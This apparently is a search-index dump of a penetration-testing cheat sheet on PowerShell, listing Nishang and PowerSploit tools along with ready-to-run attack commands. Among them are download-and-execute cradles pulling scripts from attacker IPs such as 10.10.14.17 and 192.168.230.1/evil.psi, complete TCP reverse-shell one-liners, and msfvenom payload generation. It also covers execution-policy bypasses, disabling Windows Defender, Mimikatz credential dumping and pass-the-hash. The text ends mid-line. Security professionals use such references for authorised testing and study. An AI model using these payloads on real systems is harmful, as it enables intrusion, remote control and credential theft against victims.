computer field for a particular term Get - ExploitableSystem - finds systems likely vulnerable to common exploits Invoke - EnumerateLocalAdmin - enumerates members of the local Administrators groups across all machines in the domain Nishang https://github.com/samratashok/nishang - framework and collection of scripts and payloads which enables usage of PowerShell for offensive security, penetration testing and red teaming ActiveDirectory Set-DCShadowPermissions Modify AD objects to provide minimal permissions required for DCShadow. Antak - the Webshell Antak Execute PowerShell scripts in memory, run commands, and download and upload files using this webshell. Backdoors HTTP-Backdoor A backdoor which can receive instructions from third party websites and execute PowerShell scripts in memory. DNS_TXT_Pwnage A backdoor which can receive commands and PowerShell scripts from DNS TXT queries, execute them on a target, and be remotely controlled using the queries. Execute-OnTime A backdoor which can execute PowerShell scripts at a given time on a target. Gupt-Backdoor A backdoor which can receive commands and scripts from a WLAN SSID without connecting to it. Add-ScrnSaveBackdoor A backdoor which can use Windows screen saver for remote command and script execution. Invoke-ADSBackdoor A backdoor which can use alternate data streams and Windows Registry to achieve persistence. Add-RegBackdoor A backdoor which uses well known Debugger trick to execute payload with Sticky keys and Utilman (Windows key + U). Set-RemoteWMI Modify permissions of DCOM and WMI namespaces to allow access to a non-admin user. Set-RemotePSRemoting Modify permissions of PowerShell remoting to allow access to a non-admin user. Bypass Invoke-AmsiBypass Implementation of publicly known methods to bypass/avoid AMSI. Client Out-CHM Create infected CHM files which can execute PowerShell commands and scripts. Out-Word Create Word files and infect existing ones to run PowerShell commands and scripts. Out-Excel Create Excel files and infect existing ones to run PowerShell commands and scripts. Out-HTA Create a HTA file which can be deployed on a web server and used in phishing campaigns. Out-Java Create signed JAR files which can be used with applets for script and command execution. Out-Shortcut Create shortcut files capable of executing PowerShell commands and scripts. Out-WebQuery Create IQY files for phishing credentials and SMB hashes. Out-JS Create JS files capable of executing PowerShell commands and scripts. Out-SCT Create SCT files capable of executing PowerShell commands and scripts. Out-SCF Create a SCF file which can be used for capturing NTLM hash challenges. Escalation Enable-DuplicateToken When SYSTEM privileges are required. Remove-Update Introduce vulnerabilities by removing patches. Invoke-PsUACme Bypass UAC. Execution Download-Execute-PS Download and execute a PowerShell script in memory. Download_Execute Download an executable in text format, convert it to an executable, and execute. Execute-Command-MSSQL Run PowerShell commands, native commands, or SQL commands on a MSSQL Server with sufficient privileges. Execute-DNSTXT-Code Execute shellcode in memory using DNS TXT queries. Out-RundllCommand Execute PowerShell commands and scripts or a reverse PowerShell session using rundll32.exe. Gather Check-VM Check for a virtual machine. Copy-VSS Copy the SAM file using Volume Shadow Copy Service. Invoke-CredentialsPhish Trick a user into giving credentials in plain text. FireBuster FireListener A pair of scripts for egress testing Get-Information Get juicy information from a target. Get-LSASecret Get LSA Secret from a target. Get-PassHashes Get password hashes from a target. Get-WLAN-Keys Get WLAN keys in plain text from a target. Keylogger Log keystrokes from a target. Invoke-MimikatzWdigestDowngrade Dump user passwords in plain on Windows 8.1 and Server 2012 Get-PassHints Get password hints of Windows users from a target. Show-TargetScreen Connect back and Stream target screen using MJPEG. Invoke-Mimikatz Load mimikatz in memory. Updated and with some customisation. Invoke-Mimikittenz Extract juicy information from target process (like browsers) memory using regex. Invoke-SSIDExfil Exfiltrate information like user credentials, using WLAN SSID. Invoke-SessionGopher Identify admin jump-boxes and/or computers used to access Unix machines. Extract information from Putty and RDP (ppk, rdp, stdid) Decrypt passwords for WinSCP from registry \"Admin\" required for remote operations \"-ExcludeDc\" to prevent detection MITM Invoke-Interceptor A local HTTPS proxy for MITM attacks. Pivot Create-MultipleSessions Check credentials on multiple computers and create PSSessions. Run-EXEonRemote Copy and execute an executable on multiple machines. Invoke-NetworkRelay Create network relays between computers. Prasadhak Prasadhak Check running hashes of running process against the VirusTotal database. Scan Brute-Force Brute force FTP, Active Directory, MSSQL, and Sharepoint. Port-Scan A handy port scanner. Powerpreter Powerpreter All the functionality of nishang in a single script module. Shells Invoke-PsGcat Send commands and scripts to specifed Gmail account to be executed by Invoke-PsGcatAgent Invoke-PsGcatAgent Execute commands and scripts sent by Invoke-PsGcat. Invoke-PowerShellTcp An interactive PowerShell reverse connect or bind shell Invoke-PowerShellTcpOneLine Stripped down version of Invoke-PowerShellTcp. Also contains, a skeleton version which could fit in two tweets. Invoke-PowerShellTcpOneLineBind Bind version of Invoke-PowerShellTcpOneLine. Invoke-PowerShellUdp An interactive PowerShell reverse connect or bind shell over UDP Invoke-PowerShellUdpOneLine Stripped down version of Invoke-PowerShellUdp. Invoke-PoshRatHttps Reverse interactive PowerShell over HTTPS. Invoke-PoshRatHttp Reverse interactive PowerShell over HTTP. Remove-PoshRat Clean the system after using Invoke-PoshRatHttps Invoke-PowerShellWmi Interactive PowerShell using WMI. Invoke-PowerShellIcmp An interactive PowerShell reverse shell over ICMP. Invoke-JSRatRundll An interactive PowerShell reverse shell over HTTP using rundll32.exe. Invoke-JSRatRegsvr An interactive PowerShell reverse shell over HTTP using regsvr32.exe. Utility Add-Exfiltration Add data exfiltration capability to Gmail, Pastebin, a web server, and DNS to any script. Add-Persistence Add reboot persistence capability to a script. Remove-Persistence Remote persistence added by the Add-Persistence script. Do-Exfiltration Pipe (|) this to any script to exfiltrate the output. Download Transfer a file to the target. Parse_Keys Parse keys logged by the keylogger. Invoke-Encode Encode and compress a script or string. Invoke-Decode Decode and decompress a script or string from Invoke-Encode. Start-CaptureServer Run a web server which logs Basic authentication and SMB hashes. ConvertTo-ROT13 Encode a string to ROT13 or decode a ROT13 string. Out-DnsTxt Generate DNS TXT records which could be used with other scripts. External Services Shodan: https://github.com/darkoperator/Posh-Shodan Scaning https://github.com/PowerShellMafia/PowerSploit/blob/master/Recon/Invoke-Portscan.ps1 https://github.com/samratashok/nishang/blob/master/Scan/Invoke-PortScan.ps1 Parse Nmap Reports: https://github.com/SamuelArnold/StarKill3r/blob/master/Star%20Killer/Star%20Killer/bin/Debug/Scripts/SANS-SEC505-master/scripts/Day1-PowerShell/Parse-Nmap.ps1 Paser Nessus Reports: https://github.com/darkoperator/Posh-NVS Scandiff is a PowerShell script to automate host discovery and scanning with nmap: https://github.com/hardwaterhacker/scandiff Brute Forcing Active Directory brute forcing: https://github.com/samratashok/nishang/blob/master/Scan/Invoke-BruteForce.ps1 Get-WinRMPassword - https://poshsecurity.com/blog/2014/3/20/powershell-winrm-get-winrmpassword.html Get-WimPassword Database Attacks PowerUpSQL - Toolkit for Attacking SQL Server: https://github.com/NetSPI/PowerUpSQL Execute command over MSSQL: Nishang/Execute-Command-MSSQL.ps1 Capture NTLM https://github.com/Kevin-Robertson/Inveigh Obfuscation https://github.com/danielbohannon/Invoke-Obfuscation https://github.com/danielbohannon/Invoke-DOSfuscation Fileless Malware Invoke-NoShell outputs a Microsoft Office Word .doc file with an embedded macro: https://github.com/G4lB1t/Invoke-NoShell Resources New References PowerShell Basics for Security Professionals Part 1: https://www.youtube.com/watch?v=B0EsL1j_-qw Constrained Mode: https://devblogs.microsoft.com/powershell/powershell-constrained-language-mode/ https://github.com/subTee/CVE-2014-4113/blob/master/Invoke-SystemShell.ps1 http://www.labofapenetrationtester.com/2014/12/using-nishang-with-cobalt-strike.html http://blog.cobaltstrike.com/2014/09/23/cobalt-strike-2-1-i-have-the-powershell/ Development Environment How To Make Visual Studio Code Look And Behave Like The PowerShell ISE: https://blog.techsnips.io/how-to-make-visual-studio-code-look-and-behave-like-the-powershell-ise/","title":"Powershell"},{"location":"windows/powershell/#powershell","text":"","title":"Powershell"},{"location":"windows/powershell/#collections","text":"https://sid-500.com/downloads/ Resource: Infosec PowerShell tools, resources, and authors: https://www.peerlyst.com/posts/resource-infosec-powershell-tools-resources-and-authors?utm_source=twitter utm_medium=social utm_content=peerlyst_post utm_campaign=peerlyst_shared_post Mayhem scripts: https://gist.github.com/M3T4L5T3F Collection of PowerShell network security scripts for system administrators: https://github.com/thom-s/netsec-ps-scripts","title":"Collections"},{"location":"windows/powershell/#quick-reference","text":"An A-Z Index of Windows PowerShell commands: https://ss64.com/ps/ Windows PowerShell command line syntax: https://ss64.com/ps/syntax.html https://pinvoke.net - Allowing developers to find, edit and add PInvoke * signatures, user-defined types, and any other information related to calling Win32 and other unmanaged APIs from managed code (written in languages such as C# or VB.NET). Versions v1: November 2006 - Windows XP SP2, Windows Server 2003 SP1 and Windows Vista v2: Windows 7 and Windows Server 2008 R2 (Standalone for: Windows XP SP3, Windows Server 2003 SP2, and Windows Vista SP1) v3: Windows 8 (Can be installed on: Windows 7 SP1, for Windows Server 2008 SP1, and for Windows Server 2008 R2 SP1) (no XP support) v4: Windows 8.1 (Can be installed on: Windows 7 SP1, for Windows Server 2008 SP1, and for Windows Server 2008 R2 SP1) v5: Part of Windows Management Framework (WMF) 5.0. February 24, 2016. Features OneGet PowerShell cmdlets to support Chocolatey's repository-based apps. Ability to manage layer 2 network switches Windows 10 Anniversary Update Available for Windows 7, Windows Server 2008, Windows Server 2008 R2, Windows Server 2012, and Windows Server 2012 R2 v6: PowerShell Core on 18 August 2016 Versin information: $ PSVersionTable Get - Host | Select - Object Version $ PSVersionTable Help System Get - Help Get - Process help Get - Process Update - Help Get - Help remoting Get - Help about_ * remot * Basic Execution 64 bit %SystemRoot% \\sysnative\\WindowsPowerShell\\v1.0\\powershell.exe IEX(New-Object Net.Webclient).DownloadString( http://10.10.14.17/Invoke-PowerShellTcp.ps1 ) 32 bit START /MIN /LOW CMD /C %SystemRoot% \\system32\\WindowsPowerShell\\v1.0\\powershell.exe IEX(New-Object Net.Webclient).DownloadString( http://10.11.0.50/shells/Invoke-PowerShellTcp.ps1 ) Using command line: echo IEX ( New - Object Net . WebClient ). DownloadString ( http://10.10.14.17:8000/Sherlock.ps1 ) | PowerShell - Noprofile - Basic Constructs Cmdlets Function List all Cmdlets: Get - Command - CommandTyle Cmdlet Get - Command - Name * process * Aliases: Get - Alias - Name ps Get - Alias - Definition Get - Process Check Environment C : \\ WIndows \\ Syswow64 \\ Windowspowershell \\ v1 . 0 \\ powershell . exe PSModulePath Version info: powershell - v 2 . 0 - c $ psversiontable Language mode: $ host . runspace . languagemode Check if AppLocker is enabled: Get - AppLockerPolicy - Local Powershell Version: ( Get - Host ). Version 64bit version: %SystemRoot%\\sysnative\\WindowsPowerShell\\v1.0\\powershell.exe Modules . . \\ Example . ps1 Import - Module path_to_module - verbose List all available modules: Get - Module - ListAvailable - All List all modules available in: $ env : PSModulePath All functions exposed by a module: Get - Command - Module module_name Command History (PSReadline) cat ( Get - PSReadlineOption ). HistorySavePath | sls password By default, the path is: profile : \\ AppData \\ Roaming \\ Microsoft \\ Windows \\ PowerShell \\ PSReadline \\ ConsoleHost_history . txt System Information Get - HotFix Jobs Run job on a remote machine using PSSession or by using - AsJob with - ComputerName . With - AsJob it's possible to see remote jobs using Get - Job . Start - Job - ScriptBlock { whoami } Start - Job - FilePath path Get - Job | Receive - Job Get - Job - id id | Receive - Job Remove - Job Get - Command - ParameterName AsJob Directory search: Get - HttpStatus Pass the Hash with Powershell http://www.pwnag3.com/2014/05/what-did-microsoft-just-break-with.html . \\ wce . exe \u2013 s Administrator :.: hashes - c PowerShell . exe Invoke - Mimikatz - Command sekurlsa :: pth / user : Administrator / domain :. / ntlm : ntlmhash / run : powershell . exe Persistence WMI permanent event consumers Windows registry Scheduled tasks Restricting Powershell http://www.darkoperator.com/blog/2013/3/21/powershell-basics-execution-policy-and-code-signing-part-2.html Process tracking and Module logging. ACL, Software Restriction Policies (SRP) and Application Control Policies (Applocker) could be used to control PowerShell. Both aresupported by GPO, your mileage may vary according to your implementation preferences. __PSLockDownPolicy (v3 only) Just Enough Admin \u2013 Restrict Administrative Rights - http://blogs.technet.com/b/privatecloud/archive/2014/05/14/just-enough-administration-step-by-step.aspx Auditing, Base lining and Incident Management PoshSec - https://github.com/PoshSec Kansa - https://github.com/davehull/Kansa Voyeur - https://github.com/silverhack/voyeur/ Using Virus Total API - https://github.com/darkoperator/Posh-VirusTotal Investigating PowerShell attacks https://www.defcon.org/images/defcon-22/dc-22-presentations/Kazanciyan-Hastings/DEFCON-22-Ryan-Kazanciyan-Matt-Hastings-Investigating-Powershell-Attacks-UPDATED.pdf Bypass Bypassing Applocker Policies - http://www.sixdub.net/2014/12/02/inexorable-powershell-a-red-teamers-tale-of-overcoming-simple-applocker-policies/ Allowing the execution of Powershell functionality without the use of Powershell.exe (.Net): https://github.com/Veil-Framework/PowerTools/tree/master/PowerPick Save output Get - Service | Export - CSV C : \\ Temp \\ AllServices . CSV \u2013 NoTypeInfo Get - User \u2013 Filter \u2018 Name \u2013 Like \u201c * John \u201d\u2019 | Export - CSV C : \\ Temp \\ AllUsers . CSV \u2013 NoTypeInfo Get - ChildItem \u2013 Path C : \\ Windows \\ System32 | Export - CSV C : \\ Temp \\ AllFiles . CSV - NoTypeInfo Reboots: Get-EventLog \u2013Log System \u2013Newest 100 | Where-Object { $_.EventID \u2013 eq \u2018 1074 \u2019 } | FT MachineName, UserName, TimeGenerated -AutoSize Search hotfix: Get - HotFix \u2013 ID KB2877616 Backup Group Policy: Backup - GPO \u2013 All \u2013 Path C : \\ Temp \\ AllGPO Check if all DCs are Global Catalog Servers: Get - ADDomainController \u2013 Filter * | Select Hostname , IsGlobalCatalog Powershell with HID https://github.com/samratashok/Kautilya/ http://www.labofapenetrationtester.com/search/label/Kautilya http://www.irongeek.com/i.php?page=security/plug-and-prey-malicious-usb-devices TCP / UDP / WMI Shells: https://github.com/samratashok/nishang/tree/master/Shells","title":"Quick Reference"},{"location":"windows/powershell/#download-files","text":"powershell wget http://example.com/abc.txt -outfile abc.txt Invoke-WebRequest -Uri http://192.168.0.17/PS_TCP4.ps1 -OutFile $fullpath ; powershell -c Invoke-WebRequest -Uri http://10.10.15.150/41020.exe -OutFile C:\\Users\\kostas\\Desktop\\41020.exe echo $webclient = New-Object System.Net.WebClient wget.ps1 echo $url = http://10.10.10.10/example.exe wget.ps1 echo $file = example.exe wget.ps1 echo $webclient.DownloadFile($url,$file) wget.ps1 powershell.exe -ExecutionPolicy Bypass -NoLogo -NonInterative -NoProfile -File wget.ps1 Base64 encoded payload delivery echo iex (New-Object Net.WebClient).DownloadString( http://172.16.67.128:80/6WcepYO ) | iconv --to-code UTF-16LE | base64 -w 0 kaliwmis-32 -U administrator%badpassword //10.10.10.10 cmd.exe /c powershell.exe -nop -enc base64-value","title":"Download Files"},{"location":"windows/powershell/#execution-policy","text":"Not a security feature Used to avoid accidental script execution Can be bypass with: powershell . exe - exec Bypass powershell - ExecutionPolicy bypass . \\ example . ps1 powershell - c cmd powershell - EncodedCommand cmd powershell - enc cmd $ env : PSExecutionPolicyPreference = bypass Ref: https://docs.microsoft.com/en-us/powershell/module/microsoft.powershell.core/about/about_execution_policies?view=powershell-6 15 ways to bypass PowerShell execution policy: https://www.netspi.com/blog/entryid/238/15-ways-to-bypass-the-powershell-execution-policy","title":"Execution Policy"},{"location":"windows/powershell/#reverse-shell","text":"http://www.labofapenetrationtester.com/2015/05/week-of-powershell-shells-day-1.html Start-Process -FilePath \u201c powershell \u201d -argumentlist \u201c IEX ( New-Object Net . WebClient ). downloadString ( \u2018 http : // 10 . 10 . 14 . 30 / adminshell . ps1 \u2019 ) \u201d -Credential $cred msfvenom -a x86 - -platform Windows -p windows / exec CMD = powershell -c iex(new-object net.webclient).downloadstring( http://10.10.14.159/Invoke-PowerShellTcp-8082.ps1 ) -e x86 / unicode_mixed -b \\x00\\x80\\x81\\x82\\x83\\x84\\x85\\x86\\x87\\x88\\x89\\x8a\\x8b\\x8c\\x8d\\x8e\\x8f\\x90\\x91\\x92\\x93\\x94\\x95\\x96\\x97\\x98\\x99\\x9a\\x9b\\x9c\\x9d\\x9e\\x9f\\xa0\\xa1\\xa2\\xa3\\xa4\\xa5\\xa6\\xa7\\xa8\\xa9\\xaa\\xab\\xac\\xad\\xae\\xaf\\xb0\\xb1\\xb2\\xb3\\xb4\\xb5\\xb6\\xb7\\xb8\\xb9\\xba\\xbb\\xbc\\xbd\\xbe\\xbf\\xc0\\xc1\\xc2\\xc3\\xc4\\xc5\\xc6\\xc7\\xc8\\xc9\\xca\\xcb\\xcc\\xcd\\xce\\xcf\\xd0\\xd1\\xd2\\xd3\\xd4\\xd5\\xd6\\xd7\\xd8\\xd9\\xda\\xdb\\xdc\\xdd\\xde\\xdf\\xe0\\xe1\\xe2\\xe3\\xe4\\xe5\\xe6\\xe7\\xe8\\xe9\\xea\\xeb\\xec\\xed\\xee\\xef\\xf0\\xf1\\xf2\\xf3\\xf4\\xf5\\xf6\\xf7\\xf8\\xf9\\xfa\\xfb\\xfc\\xfd\\xfe\\xff BufferRegister = EAX -f python shellcode powercat -l -v -p 4444 -t 1000 powershell -e encoded-payload $client = New-Object System . Net . Sockets . TCPClient ( 10.10.10.10 , 80 ); $stream = $client . GetStream (); [byte[]] $bytes = 0 .. 65535 |%{ 0 }; while (( $i = $stream . Read ( $bytes , 0 , $bytes . Length )) -ne 0 ){; $data = ( New-Object -TypeName System . Text . ASCIIEncoding ). GetString ( $bytes , 0 , $i ); $sendback = ( iex $data 2 1 | Out-String ); $sendback2 = $sendback + PS + ( pwd ). Path + ; $sendbyte = ( [text.encoding] :: ASCII ). GetBytes ( $sendback2 ); $stream . Write ( $sendbyte , 0 , $sendbyte . Length ); $stream . Flush ()}; $client . Close () $sm =( New-Object Net . Sockets . TCPClient ( 192.168.254.1 , 55555 )). GetStream (); [byte[]] $bt = 0 .. 255 |%{ 0 }; while (( $i = $sm . Read ( $bt , 0 , $bt . Length )) -ne 0 ){; $d =( New-Object Text . ASCIIEncoding ). GetString ( $bt , 0 , $i ); $st =( [text.encoding] :: ASCII ). GetBytes (( iex $d 2 1 )); $sm . Write ( $st , 0 , $st . Length )}","title":"Reverse Shell"},{"location":"windows/powershell/#remote-script-execution","text":"- Invoke-Expression ( New-Object Net . WebClient ) . DownloadString ( http://example.com/example.ps1 ); - iex ( New-Object Net . WebClient ) . DownloadString ( http://example.com/example.ps1 ); - powershell - EncodedCommand Base64EncodedCommand - $ ie = New-Object -ComObject InternetExplorer . Application ;$ ie . visible =$ False ;$ ie . navigate ( http://example.com/example.ps1 ); sleep 5 ;$ resp =$ ie . Document . Body . innerHTML ;$ ie . quit (); iex $ resp - iex ( iwr http://example.com/example.ps1 ) - $ h = New - Object - ComObject Msxm12 . XMLHTTP ;$h.open( GET , http://192.168.230.1/evil.psi1 ,$false);$h.send();iex $h. responseText - Craft Download Cradles: https://github.com/danielbohannon/Invoke-CradleCrafter START / B powershell -c IEX ( New-Object Net . Webclient ). downloadstring ( http://10.10.14.2/shell.ps1 ) # _/B prevents creation of a new window_ $wr [System.NET.WebRequest] :: Create ( http://192.168.230.1/evil.psi ) $r = $wr . GetResponse () IEX ( [System.IO.StreamReader] ( $r . GetResponseStream ())) . ReadToEnd ()```","title":"Remote Script execution"},{"location":"windows/powershell/#powershell-remoting","text":"Enabled by default from Windows Server 2012 Enable - PSRemoting - Force Admin privileges are required to connect Get - Command - CommandType cmdlet - ParameterName computername Get-Command -CommandType cmdlet | Where-Object { $_Parameters.Keys -- contains ComputerName - and $_Parameters.Keys -- contains Credential - and $_Parameters.Keys -- notcontains Session } WSMAN (WebServicesManagement) Protocol (WinRM) WinRM is Microsoft\u2019s implementation of WSMAN Port 5985, 5986 If target is in a workgroup, attacker's machine should trust target machine to send out credentials: Set-Item WSMan:\\localhost\\client\\trustedhosts -Value * Invoke-Command -ScriptBlock { $env : ComputerName } -ComputerName example -Credential dominName/userName - FilePath Invoke-WSManAction -Action Create -ResourceURI wmicimv2 / win32_process -ValueSet @{ commandline = powershell.exe -c Get-Process } - ComputerName domainpc \u2013 Credential Invoke-WSManAction -Action Create -ResourceURI wmicimv2 / win32_process -ValueSet @{ commandline = powershell.exe -c iex ((New-Object Net.Webclient).DownloadString( http://192.168.254. 1/reverse_powershell.ps1 )) } -ComputerName domainpc WSMAN vs PowerShell Remoting vs WMI WSMAN Firewall friendly Use HTTP and HTTPS ports Syntax is complex Returns immutable objects Can be used with non-Windows machines Powershell Remoting Firewall friendly Easy use Returns immutable objects WMI Not firewall friendly Not NAT friendly Complex Returns editable objects One to One Invoke - Command is stateless for stageful operations use PSSession Interactive, stateful session Run in a new process wsmprovhost New-PSSession $ ses = New - PSSession - ComputerName name - Credential cred Get - PSSession Enter - PSSession Interactive session: Enter - PSSession - Sessions $ ses \u200b$ cred = Get - Credential - Enter - PSSession - ComputerName 10 . 0 . 24 . 244 - Authentication Negotiate - Credential $ cred Define a function in a remote machine and call it: Invoke - Command - ScriptBlock { function Example1 { whoami ; }} - Session $ ses Invoke - Command - ScriptBlock { Example1 } - Session $ ses PSSession - CommandName Example1 - Session $ ses Export a command from a remote machine: Export - PSSession - Module name - CommandName Example1 - Session $ ses Double Hop Problem (Attacker delegate sending token to target-2 from target-1) Enable - WSManCredSSP - Role Client - DelegateComputer Enable - WSManCredSSP - Role Server Get - WSManCredSSP Enter - PSSession - ComputerName name - Credential cred - Authentication CredSSP Useful cmdlets New-PSSession Enter-PSSession Set-MpPreference -DisableRealtimeMonitoring $true #Disable Windows Defender New-PSSession -ComputerName instance $sess = New-PSSession -ComputerName instance Enter-PSSEssion - Session $sess One to Many (Fan-out Remoting) Non-interactive Parallel command execution Can: Execute scripts from files Run commands on multiple remote computers Run commands in disconnected sessions (v3) Run as background task Useful in: Perform command execution without dropping exe onto disk Useful for passing and replying hashes, tickets and other AD attacks Run commands: Invoke - Command - ScriptBlock { whoami ; hostname } - ComputerName instance Invoke - Command - ScriptBlock { Get - Process } - ComputerName ( Get - Content list - of - servers ) Run scripts: Invoke - Command - FilePath example . ps1 - ComputerName instance Run functions installed on the remote box: Invoke-Command -ScriptBlock ${ function : Invoke - Mimikatz } -ComputerName instance Invoke - Command doesn't create a session. Stateful commands: $sess = New-PSSession -ComputerName instance Invoke-Command -Session $sess -ScriptBlock { $proc = Get-Process } Invoke-Command -Session $sess -ScriptBlock { $proc . Name }","title":"Powershell Remoting"},{"location":"windows/powershell/#tools","text":"Mimikatz (ReflectivePEInjection is used to load into memory) Uses ReflectivePEInjection https://powersploit.readthedocs.io/en/latest/CodeExecution/Invoke-ReflectivePEInjection/ to load mimikatz into memory Pass the Hash Invoke - Mimikatz - Command sekurlsa::pth /user: name_of_the_user /domain:. /ntlm: ntlmhash /run:powershell.exe Invoke - Mimikatz - Command sekurlsa::pth /user:Administrator /domain:. /ntlm: ntlmhash /run:powershell.exe Invoke - Mimikatz - DumpCreds Invoke - Mimikatz - DumpCerts Dump Creds from multiple machines Invoke - Mimikatz - DumpCreds - ComputerName @ ( instance1 , instance2 ) Load PowerUp powershell - ExecutionPolicy Bypass Import - Module . / PowerUp . ps1 Invoke - AllChecks","title":"Tools"},{"location":"windows/powershell/#active-directory","text":"[ADSI] Get member of the domain admin group: ( [ ADSI ] LDAP://cn=Domain Admin,cn=Users,dc=Example,dc=com ). Members Get memberships of a user: ( [ ADSI ] LDAP://cn=Administrator,cn=Users,dc=Example,dc=com ). MemberOf .NET Class: System . DirectoryServices . ActiveDirectory Native Executable PowerShell (,Net classes or WMI or AD module)","title":"Active Directory"},{"location":"windows/powershell/#net","text":"Exploring Assemblies Finding assemblies $ Classes = [ AppDomain ]:: CurrentDomain . GetAssemblies () $ Classes = [ AppDomain ]:: CurrentDomain . GetAssemblies () | ForEach - Object {$ _ . GetTypes () } | Where - Object {$ _ . IsPublic - eq True } Working with assemblies and invoking functions $ProcClass = $Classes | Where-Object { $_.Name - eq Proccess } $ProcClass | Get-Members $ProcClass | Get-Members -MemberType Method -Static $ProcClass.GetMethods() $ProcClass::GetCurrentProcess() $ProcClass.FullName [System.Diagnostic.Process]::GetCurrentProcess() [System.Diagnostic.Process] | Get-Members -MemberType Method -Static | Format-List * Add - Type - AssemblyName System . Windows . Forms [ System . Windows . Forms . Sendkeys ] AssemblyName Add - Type - AssemblyName System . ServiceProcess [ System . ServiceProcess . ServiceController ] | Get - Members - MemberType Method - Static | Format - List * [ System . ServiceProcess . ServiceController ]:: GetDevices () TypeDefinition $ DotnetCode = @ public class SysCommands public static void lookup ( string domainname ) { System . Diagnostics . Process . Start ( ns lookup.exe , domainname ) ; } public void netcmd ( string cmd ) { string cmdstring = /k net.exe + cmd ; System . Diagnostics . Process . Start ( cmd. exe , cmdstring ) ; } public static void Main () { string cmdstring = /k net.exe + user ; System . Diagnostics . Process . Start ( cmd. exe , cmdstring ); } @ # Compile .Net code and load objects from it Add - Type - TypeDefinition $ DotnetCode - OutputType Library - OutputAssembly SysCommand . dll Add - Type - TypeDefinition $ DotnetCode - OutputType ConsoleApplication - OutputAssembly SysCommand . exe [ SysCommand ] :: lookup ( google.com ) # Load objects from a DLL into Memory $ obj = Add - Type - Path SysCommand . dll - PassThru $ obj | Get - Members [ SysCommand ] :: lookup ( google.com ) # Calling non-static functions $ obj = New - Object SysCommands $ obj . netcmd ( user ) # MemberDefinition - DLL Import $ Apicode = @ [ DllImport ( kerne132.d11 )] public static extern bool CreateSymbolicLink ( string IpSymlinkFileName , string IpTargetFileName , int dwFlags ); @ $ SymLink = Add - Type - MemberDefinition $ ApiCode - Name Symlink - Namespace CreatSymLink - PassThru $ SymLink :: CreateSymbolicLink ( C : \\ test \\ link , C : \\ Users \\ , 1 )","title":".Net"},{"location":"windows/powershell/#wmi","text":"Exploring namespaces: Get - WmiObject - Namespace root - Class __Namespace | select name List even the nested namespaces: http://www.powershellmagazine.com/2013/10/18/pstip-list-all-wmi-namespaces-on-a-system/ Exploring Classes: Get - WmiObject \u2013 NameSpace \u201c namespace \u201d \u2013 List Exploring Methods: Get - WmiObject - Class class - List | Select - Object - ExpandProperty Methods Filter based on properties of objects getting returned: Get-WmiObject -Class Win32_Process -Filter (Name = powershell.exe ) Get-WmiObject -Class Win32_Process | Where-Object { $_.Name - eq powershell.exe } Get-WmiObject -Query { Select * from Win32_Process where Name = powershell.exe } Remove - WmiObject Invoke - WmiMethod - Class Win32_Process - Name Create - ArgumentList notepad.exe Invoke - WmiMethod - Class Win32_Process - Name Create - ArgumentList notepad.exe - ComputerName name - Credential cred","title":"WMI"},{"location":"windows/powershell/#com-objects","text":"Explore available COM objects: Get - ChildItem REGISTRY :: HKEY_CLASSES_ROOT \\ CLSID - include PROGID - recurse | foreach {$ _ . GetValue ( ) } | Where - Object {$ _ - match \u201c appname } $ wscript = New - Object - ComObject WScript . Shell . 1 $ wscript | Get - Member $ wscript . CurrentDirectory $ wscript . SendKeys ( Hello ) $ wscript . Exec ( cmd ) $ wscript . CreateShortcut ( ... ) Interesting COM Objects WScript.Shell.1 Shell.Applcation.1","title":"COM Objects"},{"location":"windows/powershell/#windows-registry","text":"Get - Item HKLM:\\SOFTWARE\\Microsoft\\Windows NT\\Current Version Get - ChildItem HKLM:\\SOFTWARE\\Microsoft\\Windows NT\\Current Version - Recurse - Use registry as filesystem: Get - Provider - PSProvider Registry Set - Location Registry :: ls cd HKLM ls New - PSDrive - name RegistryDrive - PSProvider Registry - Root Registry :: dir Get - PSDrive New - Item - Path HKCU : \\ Test \\ New New - ItemProperty - Path HKCU : \\ Test \\ New - Name Reg2 - PropertyType String - Value 2 Rename - Item HKCU : \\ Test - NewName HKCU : TestNew Rename - ItemProperty HKCU : \\ Test \\ New - Name Reg2 - NewName Reg3 Set - ItemProperty - Path HKCU : \\ Test \\ New - Name Reg2 - Value 3 Client Side Attacks Out-Word Out-Excel Out-CHM Out-Shortcut Out-HTA Out-Java Encoding Invole - Encode - DataToEncode example . ps1 - OutCommand Out - CHM - Payload -e encodedValue","title":"Windows Registry"},{"location":"windows/powershell/#metasploit","text":"Using Powershell with Metasploit: https://github.com/rapid7/metasploit-framework/wiki/How-to-use-Powershell-in-an-exploit msfvenom meterpreter . / msfvenom - p windows / x64 / meterpreter / reverse_https LHOST = IP - f psh - reflection cmd / windows / reverse_powershell Useful modules: exploit/windows/smb/psexec_psh Payload is encoded exploit/windows/local/powershell_cmd_upgrade Upgrade native to Powershell post/windows/manage/powershell/exec_powershell exploit/multi/script/web_delivery","title":"Metasploit"},{"location":"windows/powershell/#modules","text":"Posh-SecMod https://github.com/darkoperator/Posh-SecMod - PowerShell Module with Security cmdlets for security work Discovery: Perform network discovery. Parse: Parsers for Nmap, DNSRecon and other type of output files from security tools. PostExploitation: Functions to help in performing post exploitation tasks. Registry: Collection of functions for manipulating the registry in remote hosts using WMI. Utilities: General purpose functions. Audit: Functions that may be usful when performing audit of systems. Database: Functions that are useful when interacting with databases. PowerSploit https://github.com/PowerShellMafia/PowerSploit - A PowerShell Post-Exploitation Framework CodeExecution Invoke - DllInjection Injects a Dll into the process ID of your choosing. Invoke - ReflectivePEInjection Reflectively loads a Windows PE file (DLL/EXE) in to the powershell process, or reflectively injects a DLL in to a remote process. Invoke - Shellcode Injects shellcode into the process ID of your choosing or within PowerShell locally . Invoke - WmiCommand Executes a PowerShell ScriptBlock on a target computer and returns its formatted output using WMI as a C2 channel. ScriptModification Out - EncodedCommand Compresses, Base-64 encodes, and generates command-line output for a PowerShell payload script. Out - CompressedDll Compresses, Base-64 encodes, and outputs generated code to load a managed dll in memory. Out - EncryptedScript Encrypts text files/scripts. Remove - Comments Strips comments and extra whitespace from a script. Persistence New - UserPersistenceOption Configure user-level persistence options for the Add-Persistence function. New - ElevatedPersistenceOption Configure elevated persistence options for the Add-Persistence function. Add - Persistence Add persistence capabilities to a script. Install - SSP Installs a security support provider (SSP) dll. Get - SecurityPackages Enumerates all loaded security packages (SSPs). AntivirusBypass Find - AVSignature Locates single Byte AV signatures utilizing the same method as DSplit from \"class101\". Exfiltration Invoke - TokenManipulation Lists available logon tokens. Creates processes with other users logon tokens, and impersonates logon tokens in the current thread. Invoke - TokenManipulation - CreateProcess cmd.exe - Username nt authority\\system GetProcess lass | Invoke - TokenManipulation - 